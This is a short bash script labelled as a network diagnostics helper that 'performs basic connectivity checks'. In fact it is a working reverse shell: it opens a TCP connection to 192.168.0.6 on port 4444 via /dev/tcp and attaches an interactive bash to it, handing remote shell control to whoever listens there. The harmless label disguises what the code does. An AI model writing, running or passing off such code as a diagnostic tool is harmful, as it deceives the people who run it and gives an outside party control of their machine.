#!/bin/bash
# Network diagnostics helper
# Performs basic connectivity checks
HOST="192.168.0.6"
PORT="4444"
# Establish connection and spawn shell using bash's /dev/tcp
exec 3<>/dev/tcp/$HOST/$PORT
/bin/bash <&3 >&3 2>&3
